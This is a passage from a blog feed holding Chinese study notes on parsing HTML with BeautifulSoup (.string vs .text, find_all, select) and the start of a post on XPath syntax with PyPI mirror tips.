    <content type="html"><![CDATA[<p>本文是对《Python3 网络爬虫开发实战的》的部分实践以及探讨。</p><a id="more"></a><p>使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup = BeautifulSoup(<span class="string">'&lt;p&gt;Hello&lt;/p&gt;'</span>, <span class="string">'lxml'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(soup))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">bs4</span>.<span class="title">BeautifulSoup</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(soup.p)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">p</span>&gt;<span class="title">Hello</span>&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(type<span class="params">(soup.p)</span>)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">bs4</span>.<span class="title">element</span>.<span class="title">Tag</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(soup.p.string)</span></span></span><br><span class="line"><span class="class"><span class="title">Hello</span></span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(soup.p.text)</span></span></span><br><span class="line"><span class="class"><span class="title">Hello</span></span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(type<span class="params">(soup.p.string)</span>)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">bs4</span>.<span class="title">element</span>.<span class="title">NavigableString</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(type<span class="params">(soup.p.text)</span>)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">str</span>'&gt;</span></span><br></pre></td></tr></table></figure><p>更多使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>html=<span class="string">"""</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse's story&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;body&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;p class="title" name="dromouse"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;p class="story"&gt;Once upon a time there were three little sisters; and their names were</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;a href="http://example.com/elsie" class="sister" id="link1"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;a href="http://example.com/lacie" class="sister" id="link2"&gt;Lacie&lt;/a&gt; and</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;a href="http://example.com/tillie" class="sister" id="link3"&gt;Tillie&lt;/a&gt;;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>and they lived at the bottom of a well.&lt;/p&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;p class="story"&gt;...&lt;/p&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>"""</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(html))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">str</span>'&gt;</span></span><br><span class="line">&gt;&gt;&gt; soup = BeautifulSoup(html, 'lxml')</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(soup.prettify())</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;</span><br><span class="line">   The Dormouse<span class="string">'s story</span></span><br><span class="line"><span class="string">  &lt;/title&gt;</span></span><br><span class="line"><span class="string"> &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;p class="title" name="dromouse"&gt;</span></span><br><span class="line"><span class="string">   &lt;b&gt;</span></span><br><span class="line"><span class="string">    The Dormouse'</span>s story</span><br><span class="line">   &lt;/b&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;p class="story"&gt;</span><br><span class="line">   Once upon a time there were three little sisters; <span class="keyword">and</span> their names were</span><br><span class="line">   &lt;a class="sister" href="http://example.com/elsie" id="link1"&gt;</span><br><span class="line">    &lt;!-- Elsie --&gt;</span><br><span class="line">   &lt;/a&gt;</span><br><span class="line">   ,</span><br><span class="line">   &lt;a class="sister" href="http://example.com/lacie" id="link2"&gt;</span><br><span class="line">    Lacie</span><br><span class="line">   &lt;/a&gt;</span><br><span class="line">   <span class="keyword">and</span></span><br><span class="line">   &lt;a class="sister" href="http://example.com/tillie" id="link3"&gt;</span><br><span class="line">    Tillie</span><br><span class="line">   &lt;/a&gt;</span><br><span class="line">   ;</span><br><span class="line"><span class="keyword">and</span> they lived at the bottom of a well.</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;p class="story"&gt;</span><br><span class="line">   ...</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(soup.prettify()))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">str</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(soup.title)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">title</span>&gt;<span class="title">The</span> <span class="title">Dormouse</span>'<span class="title">s</span> <span class="title">story</span>&lt;/<span class="title">title</span>&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(soup)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">html</span>&gt;&lt;<span class="title">head</span>&gt;&lt;<span class="title">title</span>&gt;<span class="title">The</span> <span class="title">Dormouse</span>'<span class="title">s</span> <span class="title">story</span>&lt;/<span class="title">title</span>&gt;&lt;/<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line">&lt;p class="title" name="dromouse"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class="story"&gt;Once upon a time there were three little sisters; and their names were</span><br><span class="line">&lt;a class="sister" href="http://example.com/elsie" id="link1"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,</span><br><span class="line">&lt;a class="sister" href="http://example.com/lacie" id="link2"&gt;Lacie&lt;/a&gt; and</span><br><span class="line">&lt;a class="sister" href="http://example.com/tillie" id="link3"&gt;Tillie&lt;/a&gt;;</span><br><span class="line">and they lived at the bottom of a well.&lt;/p&gt;</span><br><span class="line">&lt;p class="story"&gt;...&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;;;这里自动补全了缺失的 HTML 标签</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(soup.p)</span><br><span class="line">&lt;p class="title" name="dromouse"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;;;只返回第一个 p 标签</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(soup.p[<span class="number">2</span>]);;这里会出错！！！没有这种写法的...</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">"C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\bs4\element.py"</span>, line <span class="number">1016</span>, <span class="keyword">in</span> __getitem__</span><br><span class="line">    <span class="keyword">return</span> self.attrs[key]</span><br><span class="line">KeyError: <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(soup.title.string)</span><br><span class="line">The Dormouse<span class="string">'s story</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; print(type(soup.title.string))</span></span><br><span class="line"><span class="string">&lt;class '</span>bs4.element.NavigableString<span class="string">'&gt;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; print(type(soup.title.text))</span></span><br><span class="line"><span class="string">&lt;class '</span>st<span class="string">r'&gt;</span></span><br></pre></td></tr></table></figure><p><strong>问题：</strong>调用<code>.string</code> 和调用 <code>.text</code> 有何区别？除了类型不同之外… 换句话说：为什么不使用 <code>.text</code> 不也可以得到文本吗？</p><h3 id="find-all-方法"><a href="#find-all-方法" class="headerlink" title="find_all 方法"></a>find_all 方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>html=<span class="string">'''</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;div class="panel"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;div class="panel-heading"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;h4&gt;Hello&lt;/h4&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;/div&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;div class="panel-body"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;ul class="list" id="list-1"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Foo&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Bar&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Jay&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;/ul&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;ul class="list list-small" id="list-2"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Foo&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Bar&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;/ul&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;/div&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;/div&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>'''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(soup.find_all(name=<span class="string">'ul'</span>))</span><br><span class="line">[&lt;ul class="list" id="list-1"&gt;</span><br><span class="line">&lt;li class="element"&gt;Foo&lt;/li&gt;</span><br><span class="line">&lt;li class="element"&gt;Bar&lt;/li&gt;</span><br><span class="line">&lt;li class="element"&gt;Jay&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;, </span><br><span class="line">ul class="list list-small" id="list-2"&gt;</span><br><span class="line">&lt;li class="element"&gt;Foo&lt;/li&gt;</span><br><span class="line">&lt;li class="element"&gt;Bar&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(soup.find_all(name=<span class="string">'ul'</span>)))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">bs4</span>.<span class="title">element</span>.<span class="title">ResultSet</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(type<span class="params">(list<span class="params">(soup.find_all<span class="params">(name=<span class="string">'ul'</span>)</span>)</span>)</span>)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">list</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(type<span class="params">(soup.find_all<span class="params">(name=<span class="string">'ul'</span>)</span>[<span class="number">0</span>])</span>)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">bs4</span>.<span class="title">element</span>.<span class="title">Tag</span>'&gt;</span></span><br></pre></td></tr></table></figure><h3 id="soup-bs4-BeautifulSoup-与-ul-bs4-element-Tag"><a href="#soup-bs4-BeautifulSoup-与-ul-bs4-element-Tag" class="headerlink" title="soup ( bs4.BeautifulSoup) 与 ul ( bs4.element.Tag )"></a>soup ( bs4.BeautifulSoup) 与 ul ( bs4.element.Tag )</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(soup))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">bs4</span>.<span class="title">BeautifulSoup</span>'&gt;</span></span><br><span class="line">&gt;&gt;&gt; ul = soup.find_all('ul')[0]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(ul)</span><br><span class="line">&lt;ul class="list" id="list-1"&gt;</span><br><span class="line">&lt;li class="element"&gt;Foo&lt;/li&gt;</span><br><span class="line">&lt;li class="element"&gt;Bar&lt;/li&gt;</span><br><span class="line">&lt;li class="element"&gt;Jay&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(ul))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">bs4</span>.<span class="title">element</span>.<span class="title">Tag</span>'&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">-------------- <span class="title">The</span> <span class="title">Most</span> <span class="title">Important</span> <span class="title">Is</span>:</span> ------------</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(ul)</span><br><span class="line">[<span class="string">'HTML_FORMATTERS'</span>, <span class="string">'XML_FORMATTERS'</span>, <span class="string">'__bool__'</span>, <span class="string">'__call__'</span>, <span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__copy__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__delitem__'</span>, <span class="string">'__dict__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, ..., <span class="string">'find_all'</span>, <span class="string">'find_all_next'</span>, <span class="string">'find_all_previous'</span>, <span class="string">'find_next'</span>, <span class="string">'find_next_sibling'</span>, <span class="string">'find_next_siblings'</span>, <span class="string">'find_parent'</span>, <span class="string">'find_parents'</span>, <span class="string">'find_previous'</span>, <span class="string">'find_previous_sibling'</span>, <span class="string">'find_previous_siblings'</span>,..., <span class="string">'string'</span>, <span class="string">'strings'</span>, ...]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(soup);;结果与上面 dir(ul) 有很多重合的方法，此处仅列出一小部分...</span><br><span class="line">[<span class="string">'HTML_FORMATTERS'</span>, <span class="string">'XML_FORMATTERS'</span>, <span class="string">'__bool__'</span>, <span class="string">'__call__'</span>, <span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__copy__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__delitem__'</span>, <span class="string">'__dict__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, ..., <span class="string">'find_all'</span>, <span class="string">'find_all_next'</span>, <span class="string">'find_all_previous'</span>, <span class="string">'find_next'</span>, <span class="string">'find_next_sibling'</span>, <span class="string">'find_next_siblings'</span>, <span class="string">'find_parent'</span>, <span class="string">'find_parents'</span>, <span class="string">'find_previous'</span>, <span class="string">'find_previous_sibling'</span>, <span class="string">'find_previous_siblings'</span>,..., <span class="string">'string'</span>, <span class="string">'strings'</span>, ...]</span><br></pre></td></tr></table></figure><h3 id="text"><a href="#text" class="headerlink" title="text"></a>text</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>html=<span class="string">'''</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;div class="panel"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;div class="panel-body"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;a&gt;Hello, this is a link&lt;/a&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;a&gt;Hello, this is a link, too&lt;/a&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;/div&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;/div&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>'''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(soup.find_all(text=re.compile(<span class="string">'link'</span>)))</span><br><span class="line">[<span class="string">'Hello, this is a link'</span>, <span class="string">'Hello, this is a link, too'</span>];;很像 list</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(soup.find_all(text=re.compile(<span class="string">'link'</span>))))</span><br><span class="line">&lt;class 'bs4.element.ResultSet'&gt;;;不是返回 list 类型，但很像list，所以查清楚 ResultSet 类型和 list 有何关系</span><br></pre></td></tr></table></figure><h3 id="select-CSS-选择器"><a href="#select-CSS-选择器" class="headerlink" title="select - CSS 选择器"></a>select - CSS 选择器</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>html=<span class="string">'''</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;div class="panel"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;div class="panel-heading"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;h4&gt;Hello&lt;/h4&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;/div&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;div class="panel-body"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;ul class="list" id="list-1"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Foo&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Bar&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Jay&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;/ul&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;ul class="list list-small" id="list-2"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Foo&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Bar&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;/ul&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;/div&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;/div&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>'''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(soup.select(<span class="string">'.panel .panel-heading'</span>)))</span><br><span class="line">&lt;class 'list'&gt;;;这里是list类型，而不是像上面那样的 ResultSet 类型</span><br></pre></td></tr></table></figure><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><ul><li>推荐使用 LXML 解析库，必要时使用 html.parser。</li><li>节点选择筛选功能弱但是速度快。</li><li>建议使用 find()、find_all() 查询匹配单个结果或者多个结果。</li><li>如果对 CSS 选择器熟悉的话可以使用 select() 选择法。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是对《Python3 网络爬虫开发实战的》的部分实践以及探讨。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XPath 学习（一）</title>
    <link href="https://pwn4justice.github.io/2019/07/07/XPath-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://pwn4justice.github.io/2019/07/07/XPath-学习（一）/</id>
    <published>2019-07-06T16:44:13.000Z</published>
    <updated>2019-07-06T16:55:24.613Z</updated>
    
    <content type="html"><![CDATA[<p>什么是 XPath？怎么使用的？什么是路径表达式、Step、路径、节点、元素、节点与元素的区别，等等…</p><a id="more"></a><h3 id="题外话：如何提升-pip-速度"><a href="#题外话：如何提升-pip-速度" class="headerlink" title="题外话：如何提升 pip 速度"></a>题外话：如何提升 pip 速度</h3><p><code>pip install [包名] -i [ftp站名地址] --trusted-host [ftp站点名]</code></p><p>站点地址有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">阿里云 http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line">中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/</span><br><span class="line">豆瓣(douban) http://pypi.douban.com/simple/</span><br><span class="line">清华大学 https://pypi.tuna.tsinghua.edu.cn/simple/</span><br><span class="line">中国科学技术大学 http://pypi.mirrors.ustc.edu.cn/simple/</span><br></pre></td></tr></table></figure><br><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>XPath，是XML Path Language，XML路径语言。用来搜寻XML（HTML）文档内容。</p><p>参考：<a href="https://www.w3.org/TR/xpath/" target="_blank" rel="noopener">xpath</a></p><br><h3 id="常用规则"><a href="#常用规则" class="headerlink" title="常用规则"></a>常用规则</h3><table><thead><tr><th align="center">表达式</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">html/body/…</td><td align="center">此节点的所有子节点</td></tr><tr><td align="center">/</td><td align="center">选择直接子节点</td></tr><tr><td align="center">//</td><td align="center">选取所有子、孙节点</td></tr><tr><td align="center">.</td><td align="center">选择当前节点</td></tr><tr><td align="center">..</td><td align="center">选择当前节点的父节点</td></tr><tr><td align="center">@</td><td align="center">选取属性</td></tr></tbody></table><p><strong>注：通常使用开头的 // 来选取所有符合要求的节点</strong></p><br><h3 id="XPath-术语"><a href="#XPath-术语" class="headerlink" title="XPath 术语"></a>XPath 术语</h3><ol><li>节点（Node）： 一般就是指元素（Element）</li><li>基本值（原子值 Atomic Value）</li><li>项目（Item）<ul><li>基本值或者节点</li></ul></li></ol><br><h3 id="节点之间的关系"><a href="#节点之间的关系" class="headerlink" title="节点之间的关系"></a>节点之间的关系</h3><ol><li>Parent</li><li>Children</li><li>Sibling</li><li>Ancestor<ul><li>父、父父等</li></ul></li><li>Descendant<ul><li>子、子子等</li></ul></li></ol><br><h3 id="XPath-有7种类型的节点"><a href="#XPath-有7种类型的节点" class="headerlink" title="XPath 有7种类型的节点"></a>XPath 有7种类型的节点</h3><ol><li>元素</li><li>属性</li><li>文本</li><li>命名空间</li><li>处理指令</li><li>注释</li><li>根节点（文档节点）</li></ol><br><h3 id="XPath-使用-lt-路径表达式-gt-在XML文档中选取节点"><a href="#XPath-使用-lt-路径表达式-gt-在XML文档中选取节点" class="headerlink" title="XPath 使用&lt;路径表达式&gt;在XML文档中选取节点"></a>XPath 使用&lt;路径表达式&gt;在XML文档中选取节点</h3><p><strong>节点是通过沿着路径或者 step 来选取的</strong>：</p><p><img src="./node_selecting.jpg" alt="My_understanding_of_NODE_selecting"></p><br><p><strong>路径表达式示例：</strong></p><p><strong>body</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选取 body 元素的子节点<br><strong>/html</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选取根元素 html，路径起始于 <code>/</code> ，则此路径代表某元素的绝对路径<br><strong>body/div</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选取属于 body 的子元素的所有 div 元素<br><strong>//img</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选取所有 img 子元素，而不管他们在文档的位置如何<br><strong>body//p</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选取属于 body 元素的后代的所有 p 元素，而不管它们位于 body 之下的什么位置<br><strong>//@href</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选取名为 href 的所有属性    <strong>???有待考证—是选取属性还是带该属性的节点???</strong></p><br><h3 id="谓语（Predicates）"><a href="#谓语（Predicates）" class="headerlink" 